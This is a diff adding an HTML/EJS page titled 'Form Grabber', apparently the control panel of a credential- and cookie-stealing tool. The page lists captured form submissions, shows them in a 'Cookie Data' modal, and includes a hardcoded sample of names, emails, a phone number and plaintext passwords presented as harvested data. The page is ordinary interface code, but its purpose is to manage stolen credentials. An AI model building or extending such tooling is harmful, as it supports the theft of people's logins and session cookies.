@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Font Awesome -->
+    <!-- CSS only -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <title>Form Grabber</title>
+</head>
+
+<body>
+    <%- include('./partials/navbar.ejs') %>
+
+        <div class="container-fluid">
+            <div class="row text-center">
+                <h1>Forms Data</h1>
+            </div>
+            <div class="row">
+                <div class="col-md-12">
+                    <table class="table">
+
+                        <thead>
+                            <tr>
+                                <th scope="col">ID</th>
+                                <th scope="col">Actions</th>
+                            </tr>
+                        </thead>
+                        <tbody id="cookies-rows">
+                        </tbody>
+                    </table>
+                </div>
+
+            </div>
+        </div>
+
+        <!-- Button trigger modal -->
+        <div class="modal fade" id="cookieModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h5 class="modal-title" id="exampleModalLabel">Cookie Data</h5>
+                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                    </div>
+                    <div class="modal-body">
+                        <table class="table" style="table-layout: fixed; width: 100%">
+                            <thead>
+                                <tr>
+                                    <th scope="col">Name</th>
+                                    <th scope="col">Value</th>
+                                </tr>
+                            </thead>
+                            <tbody id="cookie-table">
+
+                            </tbody>
+                        </table>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js"
+            integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA=="
+            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <!-- MDB -->
+        <!-- CSS only -->
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
+            integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
+            crossorigin="anonymous"></script>
+        <script>
+            var formData = [
+                {
+                    id: "63348b575749092728c12ad4",
+                    fullname: "Ali",
+                    email: "ali@gmail.com",
+                    password: "password@123"
+                },
+                {
+                    id: "63348b665749092728c12ad6",
+                    username: "Stephen John",
+                    password: "stephen@john"
+                },
+                {
+                    id: "63348b6a5749092728c12ad8",
+                    fullname: "Ali Akbar",
+                    email: "ali.akbar@yahoo.com",
+                    phone: "045465765324",
+                    password: "ali@akbar"
+                }
+            ]
+            $(document).ready(() => {
+
+                function loadAllCookies() {
+                    let rows = "";
+                    formData.forEach((item) => rows += `<tr>
+                                <th scope="row">${item.id}</th>
+                                <td>
+                                    <button type="button" class="btn btn-success" onclick="showFormData('${item.id}')">
+                                        View Form Data
+                                    </button>
+                                    
+                                </td>
+                            </tr>`);
+
+                    $('#cookies-rows').html(rows)
+                    //<button type="button" class="btn btn-danger" onclick="deleteForm('${item.id}')">Delete Form</button>
+                }
+
+
+
+                loadAllCookies();
+            })
+
+            function showFormData(data) {
+                formData.forEach(item => {
+                    console.log(item)
+                    if (data === item.id) {
+                        console.log(item)
+                        let rows = "";
+                        for (i in item) {
+                            rows += "<tr>";
+                            rows += `<td>${i}</td>`;
+                            rows += `<td>${item[i]}</td>`;
+
+                            rows += "</tr>";
+                        }
+
+                        $('#cookie-table').html(rows)
+                    }
+                })
+
+                var myModal = new bootstrap.Modal(document.getElementById('cookieModal'), {
+                    keyboard: false
+                })
+
+                myModal.show()
+            }
+
+            function deleteForm(cookieid) {
+                $.get(`http://localhost:3000/api/cookies/delete/${cookieid}`, (data, status) => {
+                    if (status === "success") {
+                        location.reload();
+                    }
+                })
+            }
+        </script>
+</body>
+
+</html>
